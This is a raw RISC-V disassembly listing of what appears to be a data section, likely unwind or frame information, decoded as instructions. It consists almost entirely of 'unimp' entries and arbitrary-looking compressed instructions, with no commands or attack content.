 24c:	0000                	unimp
 24e:	0000                	unimp
 250:	0024                	addi	s1,sp,8
 252:	0000                	unimp
 254:	00b8                	addi	a4,sp,72
 256:	0000                	unimp
 258:	19a0                	addi	s0,sp,248
 25a:	8000                	0x8000
 25c:	0000                	unimp
 25e:	0000                	unimp
 260:	001c                	0x1c
 262:	0000                	unimp
 264:	0000                	unimp
 266:	0000                	unimp
 268:	0e42                	slli	t3,t3,0x10
 26a:	4430                	lw	a2,72(s0)
 26c:	0281                	addi	t0,t0,0
 26e:	0488                	addi	a0,sp,576
 270:	0c42                	slli	s8,s8,0x10
 272:	0008                	0x8
 274:	0000                	unimp
 276:	0000                	unimp
 278:	0024                	addi	s1,sp,8
 27a:	0000                	unimp
 27c:	00b8                	addi	a4,sp,72
 27e:	0000                	unimp
 280:	19bc                	addi	a5,sp,248
 282:	8000                	0x8000
 284:	0000                	unimp
 286:	0000                	unimp
 288:	0018                	0x18
 28a:	0000                	unimp
 28c:	0000                	unimp
 28e:	0000                	unimp
 290:	0e42                	slli	t3,t3,0x10
 292:	4420                	lw	s0,72(s0)
 294:	0281                	addi	t0,t0,0
 296:	0488                	addi	a0,sp,576
 298:	0c42                	slli	s8,s8,0x10
 29a:	0008                	0x8
 29c:	0000                	unimp
 29e:	0000                	unimp
 2a0:	0024                	addi	s1,sp,8
 2a2:	0000                	unimp
 2a4:	00b8                	addi	a4,sp,72
 2a6:	0000                	unimp
 2a8:	19d4                	addi	a3,sp,244
 2aa:	8000                	0x8000
 2ac:	0000                	unimp
 2ae:	0000                	unimp
 2b0:	0010                	0x10
 2b2:	0000                	unimp
 2b4:	0000                	unimp
 2b6:	0000                	unimp
 2b8:	0e42                	slli	t3,t3,0x10
 2ba:	4410                	lw	a2,8(s0)
 2bc:	0281                	addi	t0,t0,0
 2be:	0488                	addi	a0,sp,576
 2c0:	0c42                	slli	s8,s8,0x10
 2c2:	0008                	0x8
 2c4:	0000                	unimp
 2c6:	0000                	unimp
 2c8:	002c                	addi	a1,sp,8
 2ca:	0000                	unimp
 2cc:	00b8                	addi	a4,sp,72
 2ce:	0000                	unimp
 2d0:	19e4                	addi	s1,sp,252
 2d2:	8000                	0x8000
 2d4:	0000                	unimp
 2d6:	0000                	unimp
 2d8:	0036                	c.slli	zero,0xd
 2da:	0000                	unimp
 2dc:	0000                	unimp
 2de:	0000                	unimp
 2e0:	0e42                	slli	t3,t3,0x10
 2e2:	4630                	lw	a2,72(a2)
 2e4:	0281                	addi	t0,t0,0
 2e6:	0488                	addi	a0,sp,576
 2e8:	0689                	addi	a3,a3,2
 2ea:	0c42                	slli	s8,s8,0x10
 2ec:	0008                	0x8
 2ee:	c164                	sw	s1,68(a0)
 2f0:	c842                	sw	a6,16(sp)
 2f2:	c942                	sw	a6,144(sp)
 2f4:	0d42                	slli	s10,s10,0x10
 2f6:	0002                	c.slli	zero,0x0
 2f8:	0024                	addi	s1,sp,8
 2fa:	0000                	unimp
 2fc:	00b8                	addi	a4,sp,72
 2fe:	0000                	unimp
 300:	1a1a                	slli	s4,s4,0x26
 302:	8000                	0x8000
 304:	0000                	unimp
 306:	0000                	unimp
 308:	0024                	addi	s1,sp,8
 30a:	0000                	unimp
 30c:	0000                	unimp
 30e:	0000                	unimp
 310:	0e42                	slli	t3,t3,0x10
 312:	4220                	lw	s0,64(a2)
 314:	0288                	addi	a0,sp,320
 316:	0c42                	slli	s8,s8,0x10
 318:	0008                	0x8
 31a:	c85a                	sw	s6,16(sp)
 31c:	0d42                	slli	s10,s10,0x10
 31e:	0002                	c.slli	zero,0x0
 320:	002c                	addi	a1,sp,8
 322:	0000                	unimp
 324:	00b8                	addi	a4,sp,72
 326:	0000                	unimp
 328:	1a3e                	slli	s4,s4,0x2f
 32a:	8000                	0x8000
 32c:	0000                	unimp
 32e:	0000                	unimp
 330:	002a                	c.slli	zero,0xa
 332:	0000                	unimp
 334:	0000                	unimp
 336:	0000                	unimp
 338:	0e42                	slli	t3,t3,0x10
 33a:	4420                	lw	s0,72(s0)
 33c:	0281                	addi	t0,t0,0
 33e:	0488                	addi	a0,sp,576
 340:	0c42                	slli	s8,s8,0x10
 342:	0008                	0x8
 344:	c15c                	sw	a5,4(a0)
 346:	c842                	sw	a6,16(sp)
 348:	0d42                	slli	s10,s10,0x10
 34a:	0002                	c.slli	zero,0x0
 34c:	0000                	unimp
 34e:	0000                	unimp
 350:	002c                	addi	a1,sp,8
 352:	0000                	unimp
 354:	00b8                	addi	a4,sp,72
 356:	0000                	unimp
 358:	1a68                	addi	a0,sp,316
 35a:	8000                	0x8000
 35c:	0000                	unimp
 35e:	0000                	unimp
 360:	005a                	c.slli	zero,0x16
 362:	0000                	unimp
 364:	0000                	unimp
 366:	0000                	unimp
 368:	0e42                	slli	t3,t3,0x10
 36a:	4420                	lw	s0,72(s0)
 36c:	0281                	addi	t0,t0,0
 36e:	0488                	addi	a0,sp,576
 370:	0c42                	slli	s8,s8,0x10
 372:	0008                	0x8
 374:	4c02                	lw	s8,0(sp)
 376:	42c1                	li	t0,16
 378:	42c8                	lw	a0,4(a3)
 37a:	020d                	addi	tp,tp,3
 37c:	0000                	unimp
 37e:	0000                	unimp
 380:	0024                	addi	s1,sp,8
 382:	0000                	unimp
 384:	00b8                	addi	a4,sp,72
 386:	0000                	unimp
 388:	1ac2                	slli	s5,s5,0x30
 38a:	8000                	0x8000
 38c:	0000                	unimp
 38e:	0000                	unimp
 390:	00de                	slli	ra,ra,0x17
 392:	0000                	unimp
 394:	0000                	unimp
 396:	0000                	unimp
 398:	0e42                	slli	t3,t3,0x10
 39a:	01c0                	addi	s0,sp,196
 39c:	8146                	mv	sp,a7
 39e:	8802                	jr	a6
 3a0:	8904                	0x8904
 3a2:	4206                	lw	tp,64(sp)
 3a4:	080c                	addi	a1,sp,16
 3a6:	0000                	unimp
 3a8:	002c                	addi	a1,sp,8
 3aa:	0000                	unimp
 3ac:	00b8                	addi	a4,sp,72
 3ae:	0000                	unimp
 3b0:	1ba0                	addi	s0,sp,504
 3b2:	8000                	0x8000
 3b4:	0000                	unimp
 3b6:	0000                	unimp
 3b8:	0072                	c.slli	zero,0x1c
 3ba:	0000                	unimp
 3bc:	0000                	unimp
 3be:	0000                	unimp
 3c0:	0e42                	slli	t3,t3,0x10
 3c2:	4420                	lw	s0,72(s0)
 3c4:	0281                	addi	t0,t0,0
 3c6:	0488                	addi	a0,sp,576
 3c8:	0c42                	slli	s8,s8,0x10
 3ca:	0008                	0x8
 3cc:	6402                	ld	s0,0(sp)
 3ce:	42c1                	li	t0,16
 3d0:	42c8                	lw	a0,4(a3)
 3d2:	020d                	addi	tp,tp,3
 3d4:	0000                	unimp
 3d6:	0000                	unimp
 3d8:	002c                	addi	a1,sp,8
 3da:	0000                	unimp
 3dc:	00b8                	addi	a4,sp,72
 3de:	0000                	unimp
 3e0:	1c12                	slli	s8,s8,0x24
 3e2:	8000                	0x8000
 3e4:	0000                	unimp
 3e6:	0000                	unimp
 3e8:	008e                	slli	ra,ra,0x3
 3ea:	0000                	unimp
 3ec:	0000                	unimp
 3ee:	0000                	unimp
 3f0:	0e42                	slli	t3,t3,0x10
 3f2:	4440                	lw	s0,12(s0)
 3f4:	0281                	addi	t0,t0,0
 3f6:	0488                	addi	a0,sp,576
 3f8:	0c42                	slli	s8,s8,0x10
 3fa:	0008                	0x8
 3fc:	8002                	0x8002
 3fe:	42c1                	li	t0,16
 400:	42c8                	lw	a0,4(a3)
 402:	020d                	addi	tp,tp,3
 404:	0000                	unimp
 406:	0000                	unimp
 408:	002c                	addi	a1,sp,8
 40a:	0000                	unimp
 40c:	00b8                	addi	a4,sp,72
 40e:	0000                	unimp
 410:	1ca0                	addi	s0,sp,632
 412:	8000                	0x8000
 414:	0000                	unimp
 416:	0000                	unimp
 418:	0100                	addi	s0,sp,128
 41a:	0000                	unimp
 41c:	0000                	unimp
 41e:	0000                	unimp
 420:	0e42                	slli	t3,t3,0x10
 422:	02d0                	addi	a2,sp,324
 424:	8144                	0x8144
 426:	8802                	jr	a6
 428:	4204                	lw	s1,0(a2)
 42a:	080c                	addi	a1,sp,16
 42c:	0200                	addi	s0,sp,256
 42e:	c1f2                	sw	t3,192(sp)
 430:	c842                	sw	a6,16(sp)
 432:	0d42                	slli	s10,s10,0x10
 434:	0002                	c.slli	zero,0x0
 436:	0000                	unimp
 438:	0024                	addi	s1,sp,8
 43a:	0000                	unimp
 43c:	00b8                	addi	a4,sp,72
 43e:	0000                	unimp
 440:	1da0                	addi	s0,sp,760
 442:	8000                	0x8000
 444:	0000                	unimp
 446:	0000                	unimp
 448:	006c                	addi	a1,sp,12
 44a:	0000                	unimp
 44c:	0000                	unimp
 44e:	0000                	unimp
 450:	0e42                	slli	t3,t3,0x10
 452:	4220                	lw	s0,64(a2)
 454:	0288                	addi	a0,sp,320
 456:	0c42                	slli	s8,s8,0x10
 458:	0008                	0x8
 45a:	6202                	ld	tp,0(sp)
 45c:	42c8                	lw	a0,4(a3)
 45e:	020d                	addi	tp,tp,3
 460:	0024                	addi	s1,sp,8
 462:	0000                	unimp
 464:	00b8                	addi	a4,sp,72
 466:	0000                	unimp
 468:	1e0c                	addi	a1,sp,816
 46a:	8000                	0x8000
 46c:	0000                	unimp
 46e:	0000                	unimp
 470:	0068                	addi	a0,sp,12
 472:	0000                	unimp
 474:	0000                	unimp
 476:	0000                	unimp
 478:	0e42                	slli	t3,t3,0x10
 47a:	4220                	lw	s0,64(a2)
 47c:	0288                	addi	a0,sp,320
 47e:	0c42                	slli	s8,s8,0x10
 480:	0008                	0x8
 482:	5e02                	lw	t3,32(sp)
 484:	42c8                	lw	a0,4(a3)
 486:	020d                	addi	tp,tp,3
 488:	0034                	addi	a3,sp,8
 48a:	0000                	unimp
 48c:	00b8                	addi	a4,sp,72
 48e:	0000                	unimp
 490:	1e74                	addi	a3,sp,828
 492:	8000                	0x8000
 494:	0000                	unimp
 496:	0000                	unimp
 498:	035e                	slli	t1,t1,0x17
 49a:	0000                	unimp
 49c:	0000                	unimp
 49e:	0000                	unimp
 4a0:	0e42                	slli	t3,t3,0x10
 4a2:	4870                	lw	a2,84(s0)
 4a4:	0281                	addi	t0,t0,0
 4a6:	0488                	addi	a0,sp,576
 4a8:	0689                	addi	a3,a3,2
 4aa:	0892                	slli	a7,a7,0x4
 4ac:	0c42                	slli	s8,s8,0x10
 4ae:	0008                	0x8
 4b0:	c1034803          	lbu	a6,-1008(t1) # 1ac10 <_tbss_end+0x1ab8c>
 4b4:	c842                	sw	a6,16(sp)
 4b6:	c942                	sw	a6,144(sp)
 4b8:	d242                	sw	a6,36(sp)
 4ba:	0d42                	slli	s10,s10,0x10
 4bc:	0002                	c.slli	zero,0x0
 4be:	0000                	unimp
 4c0:	002c                	addi	a1,sp,8
 4c2:	0000                	unimp
 4c4:	00b8                	addi	a4,sp,72
 4c6:	0000                	unimp
 4c8:	21d2                	fld	ft3,272(sp)
 4ca:	8000                	0x8000
 4cc:	0000                	unimp
 4ce:	0000                	unimp
 4d0:	004e                	c.slli	zero,0x13
 4d2:	0000                	unimp
 4d4:	0000                	unimp
 4d6:	0000                	unimp
 4d8:	0e42                	slli	t3,t3,0x10
 4da:	4470                	lw	a2,76(s0)
 4dc:	1281                	addi	t0,t0,-32
 4de:	1488                	addi	a0,sp,608
 4e0:	0c42                	slli	s8,s8,0x10
 4e2:	4008                	lw	a0,0(s0)
 4e4:	4002                	0x4002
 4e6:	42c1                	li	t0,16
 4e8:	42c8                	lw	a0,4(a3)
 4ea:	020c                	addi	a1,sp,256
 4ec:	0000                	unimp
 4ee:	0000                	unimp
 4f0:	0024                	addi	s1,sp,8
 4f2:	0000                	unimp
 4f4:	00b8                	addi	a4,sp,72
 4f6:	0000                	unimp
 4f8:	2220                	fld	fs0,64(a2)
 4fa:	8000                	0x8000
 4fc:	0000                	unimp
 4fe:	0000                	unimp
 500:	0046                	c.slli	zero,0x11
 502:	0000                	unimp
 504:	0000                	unimp
 506:	0000                	unimp
 508:	0e42                	slli	t3,t3,0x10
 50a:	4240                	lw	s0,4(a2)
 50c:	0288                	addi	a0,sp,320
 50e:	0c42                	slli	s8,s8,0x10
 510:	0008                	0x8
 512:	c87c                	sw	a5,84(s0)
 514:	0d42                	slli	s10,s10,0x10
 516:	0002                	c.slli	zero,0x0
 518:	002c                	addi	a1,sp,8
 51a:	0000                	unimp
 51c:	00b8                	addi	a4,sp,72
 51e:	0000                	unimp
 520:	2266                	fld	ft4,88(sp)
 522:	8000                	0x8000
 524:	0000                	unimp
 526:	0000                	unimp
 528:	00b4                	addi	a3,sp,72
 52a:	0000                	unimp
 52c:	0000                	unimp
 52e:	0000                	unimp
 530:	0e42                	slli	t3,t3,0x10
 532:	0280                	addi	s0,sp,320
 534:	8144                	0x8144
 536:	880e                	mv	a6,gp
 538:	4210                	lw	a2,0(a2)
 53a:	080c                	addi	a1,sp,16
 53c:	0230                	addi	a2,sp,264
 53e:	c1a6                	sw	s1,192(sp)
 540:	c842                	sw	a6,16(sp)
 542:	0c42                	slli	s8,s8,0x10
 544:	0002                	c.slli	zero,0x0
 546:	0000                	unimp
 548:	0024                	addi	s1,sp,8
 54a:	0000                	unimp
 54c:	00b8                	addi	a4,sp,72
 54e:	0000                	unimp
 550:	231a                	fld	ft6,384(sp)
 552:	8000                	0x8000
 554:	0000                	unimp
 556:	0000                	unimp
 558:	00b8                	addi	a4,sp,72
 55a:	0000                	unimp
 55c:	0000                	unimp
 55e:	0000                	unimp
 560:	0e42                	slli	t3,t3,0x10
 562:	4250                	lw	a2,4(a2)
 564:	0288                	addi	a0,sp,320
 566:	0c42                	slli	s8,s8,0x10
 568:	0008                	0x8
 56a:	ae02                	fsd	ft0,280(sp)
 56c:	42c8                	lw	a0,4(a3)
 56e:	020d                	addi	tp,tp,3
 570:	0024                	addi	s1,sp,8
 572:	0000                	unimp
 574:	00b8                	addi	a4,sp,72
 576:	0000                	unimp
 578:	23d2                	fld	ft7,272(sp)
 57a:	8000                	0x8000
 57c:	0000                	unimp
 57e:	0000                	unimp
 580:	00ce                	slli	ra,ra,0x13
 582:	0000                	unimp
 584:	0000                	unimp
 586:	0000                	unimp
 588:	0e42                	slli	t3,t3,0x10
 58a:	4250                	lw	a2,4(a2)
 58c:	0288                	addi	a0,sp,320
 58e:	0c42                	slli	s8,s8,0x10
 590:	0008                	0x8
 592:	c402                	sw	zero,8(sp)
 594:	42c8                	lw	a0,4(a3)
 596:	020d                	addi	tp,tp,3
 598:	0024                	addi	s1,sp,8
 59a:	0000                	unimp
 59c:	00b8                	addi	a4,sp,72
 59e:	0000                	unimp
 5a0:	24a0                	fld	fs0,72(s1)
 5a2:	8000                	0x8000
 5a4:	0000                	unimp
 5a6:	0000                	unimp
 5a8:	003c                	addi	a5,sp,8
 5aa:	0000                	unimp
 5ac:	0000                	unimp
 5ae:	0000                	unimp
 5b0:	0e42                	slli	t3,t3,0x10
 5b2:	4230                	lw	a2,64(a2)
 5b4:	0288                	addi	a0,sp,320
 5b6:	0c42                	slli	s8,s8,0x10
 5b8:	0008                	0x8
 5ba:	c872                	sw	t3,16(sp)
 5bc:	0d42                	slli	s10,s10,0x10
 5be:	0002                	c.slli	zero,0x0
 5c0:	0024                	addi	s1,sp,8
 5c2:	0000                	unimp
 5c4:	00b8                	addi	a4,sp,72
 5c6:	0000                	unimp
 5c8:	24dc                	fld	fa5,136(s1)
 5ca:	8000                	0x8000
 5cc:	0000                	unimp
 5ce:	0000                	unimp
 5d0:	004e                	c.slli	zero,0x13
 5d2:	0000                	unimp
 5d4:	0000                	unimp
 5d6:	0000                	unimp
 5d8:	0e42                	slli	t3,t3,0x10
 5da:	4230                	lw	a2,64(a2)
 5dc:	0288                	addi	a0,sp,320
 5de:	0c42                	slli	s8,s8,0x10
 5e0:	0008                	0x8
 5e2:	4402                	lw	s0,0(sp)
 5e4:	42c8                	lw	a0,4(a3)
 5e6:	020d                	addi	tp,tp,3
 5e8:	0024                	addi	s1,sp,8
 5ea:	0000                	unimp
 5ec:	00b8                	addi	a4,sp,72
 5ee:	0000                	unimp
 5f0:	252a                	fld	fa0,136(sp)
 5f2:	8000                	0x8000
 5f4:	0000                	unimp
 5f6:	0000                	unimp
 5f8:	0070                	addi	a2,sp,12
 5fa:	0000                	unimp
 5fc:	0000                	unimp
 5fe:	0000                	unimp
 600:	0e42                	slli	t3,t3,0x10
 602:	4230                	lw	a2,64(a2)
 604:	0288                	addi	a0,sp,320
 606:	0c42                	slli	s8,s8,0x10
 608:	0008                	0x8
 60a:	6602                	ld	a2,0(sp)
 60c:	42c8                	lw	a0,4(a3)
 60e:	020d                	addi	tp,tp,3
 610:	0024                	addi	s1,sp,8
 612:	0000                	unimp
 614:	00b8                	addi	a4,sp,72
 616:	0000                	unimp
 618:	259a                	fld	fa1,384(sp)
 61a:	8000                	0x8000
 61c:	0000                	unimp
 61e:	0000                	unimp
 620:	004a                	c.slli	zero,0x12
 622:	0000                	unimp
 624:	0000                	unimp
 626:	0000                	unimp
 628:	0e42                	slli	t3,t3,0x10
 62a:	4230                	lw	a2,64(a2)
 62c:	0288                	addi	a0,sp,320
 62e:	0c42                	slli	s8,s8,0x10
 630:	0008                	0x8
 632:	4002                	0x4002
 634:	42c8                	lw	a0,4(a3)
 636:	020d                	addi	tp,tp,3
 638:	0024                	addi	s1,sp,8
 63a:	0000                	unimp
 63c:	00b8                	addi	a4,sp,72
 63e:	0000                	unimp
 640:	25e4                	fld	fs1,200(a1)
 642:	8000                	0x8000
 644:	0000                	unimp
 646:	0000                	unimp
 648:	00dc                	addi	a5,sp,68
 64a:	0000                	unimp
 64c:	0000                	unimp
 64e:	0000                	unimp
 650:	0e42                	slli	t3,t3,0x10
 652:	4230                	lw	a2,64(a2)
 654:	0288                	addi	a0,sp,320
 656:	0c42                	slli	s8,s8,0x10
 658:	0008                	0x8
 65a:	d202                	sw	zero,36(sp)
 65c:	42c8                	lw	a0,4(a3)
 65e:	020d                	addi	tp,tp,3
